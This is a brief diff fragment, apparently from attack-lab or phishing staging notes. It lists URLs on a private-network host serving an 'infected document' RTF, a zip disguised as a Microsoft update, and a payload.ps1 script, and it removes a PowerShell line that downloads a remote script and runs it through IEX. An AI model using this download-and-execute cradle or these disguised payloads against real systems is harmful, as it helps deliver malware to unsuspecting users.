@@ -21,7 +21,7 @@ http://192.168.1.137:8080/documento_infectado.rtf
 
 http://192.168.1.137:8080/microsoft_update.page.zip
 
-$s=New-Object Net.WebClient;$s.DownloadString("http://...")|IEX
+http://192.168.1.137/payload.ps1
 
 
 
